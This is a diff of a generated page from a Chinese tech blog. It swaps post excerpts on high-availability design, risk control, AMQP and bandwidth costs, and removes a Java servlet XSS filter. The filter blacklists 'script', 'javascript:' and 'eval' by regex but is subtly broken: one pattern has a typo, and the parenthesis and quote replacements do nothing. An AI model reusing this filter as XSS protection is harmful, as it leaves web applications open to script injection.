@@ -467,506 +467,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/service-design/design-3/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="上善若水">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水の技术簿">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2018/03/24/service-design/design-3/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/17/index.html">高可用架构设计考虑</a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-03-24 08:00:00" itemprop="dateCreated datePublished" datetime="2018-03-24T08:00:00+08:00">2018-03-24</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-09-03 13:45:11" itemprop="dateModified" datetime="2019-09-03T13:45:11+08:00">2019-09-03</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/服务架构/" itemprop="url" rel="index"><span itemprop="name">服务架构</span></a></span>
-
-                
-                
-                  ，
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/服务架构/服务设计原则/" itemprop="url" rel="index"><span itemprop="name">服务设计原则</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body han-init-context" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">结合springcloud</span><br><span class="line"></span><br><span class="line">1.服务分级SOA</span><br><span class="line">2.流量带宽(1M17用户.按一千万并发计算需要600M带宽.当然1M17用户前提是网页数据60kb)</span><br><span class="line">3.数据库分层(垂直.横向是最基本的.还有灵活添加\卸载数据库).</span><br><span class="line">千万级别用户.数据量至少亿级别.数据库每百万分一个.</span><br><span class="line">至少100+数据库(若要是应对高并发.高峰流量冲击可以使用AliSQL)</span><br><span class="line"></span><br><span class="line">4.那么准备zuul网关服务器就得有(按每个tomcat并发1500计算)</span><br><span class="line"></span><br><span class="line">要考虑的点.</span><br><span class="line"></span><br><span class="line">网卡属性.tomcat支持并发.</span><br><span class="line">nginx支持并发(用来放在zuul前面可以支持一台服务器部署多个zuul).</span><br><span class="line">内存容量.cpu计算能力.</span><br><span class="line"></span><br><span class="line">内存用量和cpu计算能力 限定了数据库和tomcat计算能力.所以也不是单看一个点就能估算并发能力</span><br><span class="line"></span><br><span class="line">5.还有访问深度.访问跟踪各个服务跟踪状况.</span><br><span class="line"></span><br><span class="line">还是得学习啊</span><br></pre></td></tr></table></figure>
-<p>{———-}</p>
-<p>限流<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">限制瞬时并发</span><br><span class="line">限制总并发数</span><br><span class="line">限制时间窗口内平均速率</span><br><span class="line"></span><br><span class="line">相关算法：滑动窗口协议 漏桶---   令牌桶----应对突发流量   计数器</span><br></pre></td></tr></table></figure></p>
-
-          
-        
-      
-    </div>
-
-    
-      
-
-  <div class="popular-posts-header">相关文章</div>
-  <ul class="popular-posts">
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/10/31/service-design/design-7/" rel="bookmark">集群调度框架总结</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/10/04/service-design/design-6/" rel="bookmark">微博社交广告系统架构实践</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/service-design/design-0/" rel="bookmark">系统设计一些基本原则</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/service-design/design-1/" rel="bookmark">分布式架构</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/service-design/design-2/" rel="bookmark">医院总流程图</a></div>
-      
-    </li>
-  
-  </ul>
-
-
-    
-
-    
-    
-    
-
-    
-
-    
-       
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/service-design/design-5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="上善若水">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水の技术簿">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2018/03/24/service-design/design-5/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/17/index.html">风控系统</a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-03-24 08:00:00" itemprop="dateCreated datePublished" datetime="2018-03-24T08:00:00+08:00">2018-03-24</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-09-03 13:45:11" itemprop="dateModified" datetime="2019-09-03T13:45:11+08:00">2019-09-03</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/服务架构/" itemprop="url" rel="index"><span itemprop="name">服务架构</span></a></span>
-
-                
-                
-                  ，
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/服务架构/风控系统/" itemprop="url" rel="index"><span itemprop="name">风控系统</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body han-init-context" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p><img src="http://upload-images.jianshu.io/upload_images/6434888-370daa6d8113e8f2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<h4 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h4><pre><code>监控交易、渠道产品用户、从而识别交易风险、尽早发现欺诈
-</code></pre><h4 id="功能需求"><a href="#功能需求" class="headerlink" title="功能需求"></a>功能需求</h4><pre><code>实时监控、
-    针对各类支付业务交易风险事件进行监测与控制
-
-同步反馈、
-    接受处理支付业务平台支付信息请求、并由风控系统将处理结果实时返回业务系统
-
-联动控制、
-    对风控系统识别出的风险信息、进行系统自动化、通过人工预置策略实现
-
-持续迭代、
-    交易风险特征识别方式可以通过系统自动整理、人工设定参数、
-    或者与外部资源共享等进行持续动态更新
-</code></pre><p>{———-}</p>
-<h4 id="非功能性需求"><a href="#非功能性需求" class="headerlink" title="非功能性需求"></a>非功能性需求</h4><pre><code>灵活性、
-    风控规则经常调整、由此能与不同业务系统集成
-
-性能、
-    100ms异步操作、以及高吞吐量
-
-准确性、
-    冻结账户以及相关交易单元
-
-平衡点、   
-    准确性低与大面积投诉请求、公司形象
-
-盲点：不可以盲目追求数据一致性
-</code></pre><h3 id="风控实时引擎"><a href="#风控实时引擎" class="headerlink" title="风控实时引擎"></a>风控实时引擎</h3><pre><code>0--------100
-不可评估-----风险值越高、风险越大
-
-公司风控数据主要来自风控引擎
-</code></pre><h4 id="规则引擎优缺点"><a href="#规则引擎优缺点" class="headerlink" title="规则引擎优缺点"></a>规则引擎优缺点</h4><pre><code>优点：规则变动比较频繁、其他部分相对稳定
-通过引入规则引擎可以结构系统与规则、提高复杂逻辑的可维护性、提高规则可理解性
-</code></pre><h5 id="风控准实时引擎"><a href="#风控准实时引擎" class="headerlink" title="风控准实时引擎"></a>风控准实时引擎</h5><pre><code>某些情况下、需要通过对最近一段时间内数据分析
-
-例：对最近半个月数据分析、
-分工准实时引擎、
-从消息服务器获取交易数据
-对交易数据进行异步分析、
-分析结果通过分控服务存入风控数据库、
-供实时风控引擎评估风险
-
-
-风控准实施引擎从发现异常到风控数据生效时间在100ms以内、可有效防止交易风险增大
-
-风控系统初始建设中风控准实时引擎、
-往往是通过消息监听器消息、把中间数据存储redis、对数据进行多维度分析
-</code></pre><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><pre><code>1、每月进行一次数据风控数据处理
-2、实时分析引擎
-3、数据落地服务
-4、规则引擎：本地数据、第三方消费数据
-5、奖励、处罚
-</code></pre>
-          
-        
-      
-    </div>
-
-    
-      
-
-  <div class="popular-posts-header">相关文章</div>
-  <ul class="popular-posts">
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/10/31/service-design/design-7/" rel="bookmark">集群调度框架总结</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/10/04/service-design/design-6/" rel="bookmark">微博社交广告系统架构实践</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/service-design/design-0/" rel="bookmark">系统设计一些基本原则</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/service-design/design-1/" rel="bookmark">分布式架构</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/service-design/design-2/" rel="bookmark">医院总流程图</a></div>
-      
-    </li>
-  
-  </ul>
-
-
-    
-
-    
-    
-    
-
-    
-
-    
-       
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/service-design/design-4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1143,7 +643,7 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/service-design/design-2/" rel="bookmark">医院总流程图</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/service-design/design-3/" rel="bookmark">高可用架构设计考虑</a></div>
       
     </li>
   
@@ -1200,7 +700,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/hack/filter-xss/">
+    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/agreement/amqp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="上善若水">
@@ -1220,7 +720,7 @@
           <h2 class="post-title" itemprop="name headline">
                 
                 
-                <a href="/2018/03/24/hack/filter-xss/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/17/index.html">Filter安全过滤高级最终行（XSS攻击）</a>
+                <a href="/2018/03/24/agreement/amqp/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/17/index.html">AMQP</a>
               
             
           </h2>
@@ -1262,7 +762,452 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-09-03 13:45:12" itemprop="dateModified" datetime="2019-09-03T13:45:12+08:00">2019-09-03</time>
+                <time title="修改时间：2019-09-03 13:45:11" itemprop="dateModified" datetime="2019-09-03T13:45:11+08:00">2019-09-03</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/agreement/" itemprop="url" rel="index"><span itemprop="name">agreement</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body han-init-context" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>AMQP，即Advanced Message Queuing Protocol、高级队列消息协议</p>
+<p>一个提供统一消息服务的应用层标准高级消息队列协议,是应用层协议的一个开放标准,为面向消息的中间件设计。<br>基于此协议的客户端与消息中间件可传递消息，并不受客户端/中间件不同产品，不同的开发语言等条件的限制。<br>Erlang中的实现有 RabbitMQ等。</p>
+<p><strong>协议特性</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、消息方向</span><br><span class="line">2、消息队列</span><br><span class="line">3、消息路由</span><br><span class="line">4、消息可靠性</span><br><span class="line">5、消息安全性</span><br></pre></td></tr></table></figure>
+<p>{———-}</p>
+<p><strong>协议元素</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、producer---生产者</span><br><span class="line">2、consumer---消费者</span><br><span class="line">3、virtual host --虚拟主机</span><br><span class="line">4、exchange----交换器</span><br><span class="line">5、queue----消息队列</span><br><span class="line">6、message--消息</span><br></pre></td></tr></table></figure>
+<p>定义了 消息发送过程 以及消息系统必须的特性和<br>具体的消息流转实现   发送方式 可以看看RabbitMQ　消息发送流程<br>rabbitMQ严格按照AMQP协议定制实现的</p>
+
+          
+        
+      
+    </div>
+
+    
+      
+
+  <div class="popular-posts-header">相关文章</div>
+  <ul class="popular-posts">
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/agreement/https/" rel="bookmark">Https协议</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/agreement/http/" rel="bookmark">http协议</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/agreement/rpc/" rel="bookmark">RPC</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/agreement/about-agreement/" rel="bookmark">关于协议</a></div>
+      
+    </li>
+  
+  </ul>
+
+
+    
+
+    
+    
+    
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/service-deploy/bandwidth/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="上善若水">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="上善若水の技术簿">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2018/03/24/service-deploy/bandwidth/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/17/index.html">服务器带宽</a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-03-24 08:00:00" itemprop="dateCreated datePublished" datetime="2018-03-24T08:00:00+08:00">2018-03-24</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-03 13:45:11" itemprop="dateModified" datetime="2019-09-03T13:45:11+08:00">2019-09-03</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/service-deploy/" itemprop="url" rel="index"><span itemprop="name">service-deploy</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body han-init-context" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><strong>首先要知道影响在线人数的因素</strong></p>
+<p>1，访问量</p>
+<p>2，网站类型：如果是出文字的网站(如小说站)，1M带宽带动日均5000IP，还勉强。如果是普通网站有图片，有文字、论坛、新闻资讯类型网站 大概1M能带一千IP。考虑到高峰期并发，1M高峰期还会卡。【最低配 单核CPU+512内存。1千IP CPU占用10%左右，内存200到300之间】。</p>
+<p><strong>下面根据影响因素计算下1M带宽能同时承受多少人在线(以网络状况良好为前提)</strong></p>
+<p>1、</p>
+<p><a href="http://www.wusiwei.com/post-904.html" target="_blank" rel="noopener">打开网站8秒原则</a>;</p>
+<p>2、 评判的只是：用户从云服务器下载文件的速度;</p>
+<p>3、 页面的标准尺寸大小为：60KB;</p>
+<p>参考公式：<strong>支持连接个人 = 服务器带宽/页面尺寸大小</strong></p>
+<p>{———-}</p>
+<p>通过计算大致结果是，1Mbps的带宽(服务器的1M带宽最快上下速度能达到1M/s，跟我们家用的带宽稍有区别)支持的连接数为：17个</p>
+<p>因此，N M带宽可以支持的同时在线人数大概为N*17个</p>
+<p>所以，1M带宽的云主机，日均3000IP以下应该没问题。当然如果你的每个页面都比较大的话，那就没这么多了。具体多少，可以按照上面的算法算下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">初次访问 362kb</span><br><span class="line">第二次访问 36kb</span><br><span class="line"></span><br><span class="line">pv 8641+2007+1000 = 11648</span><br><span class="line"></span><br><span class="line">pv * 362 = 4216576kb = 4117.75MB  4GB流量</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">market</span><br><span class="line">初次171kb</span><br><span class="line">第二次 28kb</span><br><span class="line"></span><br><span class="line">pv= 3000</span><br><span class="line"></span><br><span class="line">pv * 171 = 513000 = =500.97MB</span><br><span class="line"></span><br><span class="line">一天按5GB 流量</span><br><span class="line"></span><br><span class="line">30天 是 150GB流量</span><br><span class="line"></span><br><span class="line">0.8 * 150 = 120RMB</span><br><span class="line"></span><br><span class="line">带宽</span><br><span class="line"></span><br><span class="line">5 Mbps  125 RMB</span><br><span class="line"></span><br><span class="line">10 Mbps  125 + （10 - 5 ）* 80RMB = =525 RMB元</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    
+      
+
+  <div class="popular-posts-header">相关文章</div>
+  <ul class="popular-posts">
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/07/04/service-deploy/ftp/" rel="bookmark">ftp部署</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/05/26/service-deploy/nexus/" rel="bookmark">nexus部署</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/05/26/service-deploy/jenkins/" rel="bookmark">jenkins部署</a></div>
+      
+    </li>
+  
+  </ul>
+
+
+    
+
+    
+    
+    
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/hack/art-infiltration/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="上善若水">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="上善若水の技术簿">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2018/03/24/hack/art-infiltration/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/17/index.html">渗透的艺术</a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-03-24 08:00:00" itemprop="dateCreated datePublished" datetime="2018-03-24T08:00:00+08:00">2018-03-24</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-03 13:45:11" itemprop="dateModified" datetime="2019-09-03T13:45:11+08:00">2019-09-03</time>
               
             
           </span>
@@ -1315,10 +1260,47 @@
       
         
           
-            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">package com.what21.filter.xss;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.LinkedHashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">import javax.servlet.Filter;</span><br><span class="line">import javax.servlet.FilterChain;</span><br><span class="line">import javax.servlet.FilterConfig;</span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.ServletRequest;</span><br><span class="line">import javax.servlet.ServletResponse;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line">public class XSSFilter implements Filter &#123;</span><br><span class="line"></span><br><span class="line">    // XSS处理Map</span><br><span class="line">    private static Map&lt;String,String&gt; xssMap = new LinkedHashMap&lt;String,String&gt;();</span><br><span class="line"></span><br><span class="line">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="line">        // 含有脚本： script</span><br><span class="line">        xssMap.put(&quot;[s|S][c|C][r|R][i|C][p|P][t|T]&quot;, &quot;&quot;);</span><br><span class="line">        // 含有脚本 javascript</span><br><span class="line">        xssMap.put(&quot;[\\\&quot;\\\&apos;][\\s]*[j|J][a|A][v|V][a|A][s|S][c|C][r|R][i|I][p|P][t|T]:(.*)[\\\&quot;\\\&apos;]&quot;, &quot;\&quot;\&quot;&quot;);</span><br><span class="line">        // 含有函数： eval</span><br><span class="line">        xssMap.put(&quot;[e|E][v|V][a|A][l|L]\\((.*)\\)&quot;, &quot;&quot;);</span><br><span class="line">        // 含有符号 &lt;</span><br><span class="line">        xssMap.put(&quot;&lt;&quot;, &quot;&amp;lt;&quot;);</span><br><span class="line">        // 含有符号 &gt;</span><br><span class="line">        xssMap.put(&quot;&gt;&quot;, &quot;&amp;gt;&quot;);</span><br><span class="line">        // 含有符号 (</span><br><span class="line">        xssMap.put(&quot;\\(&quot;, &quot;(&quot;);</span><br><span class="line">        // 含有符号 )</span><br><span class="line">        xssMap.put(&quot;\\)&quot;, &quot;)&quot;);</span><br><span class="line">        // 含有符号 &apos;</span><br><span class="line">        xssMap.put(&quot;&apos;&quot;, &quot;&apos;&quot;);</span><br><span class="line">        // 含有符号 &quot;</span><br><span class="line">        xssMap.put(&quot;\&quot;&quot;, &quot;\&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void doFilter(ServletRequest request, ServletResponse response,</span><br><span class="line">            FilterChain chain) throws IOException, ServletException &#123;</span><br><span class="line">        // 强制类型转换 HttpServletRequest</span><br><span class="line">        HttpServletRequest httpReq = (HttpServletRequest)request;</span><br><span class="line">        // 构造HttpRequestWrapper对象处理XSS</span><br><span class="line">        HttpRequestWrapper httpReqWarp = new HttpRequestWrapper(httpReq,xssMap);</span><br><span class="line">        //</span><br><span class="line">        chain.doFilter(httpReqWarp, response);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>{———-}</p>
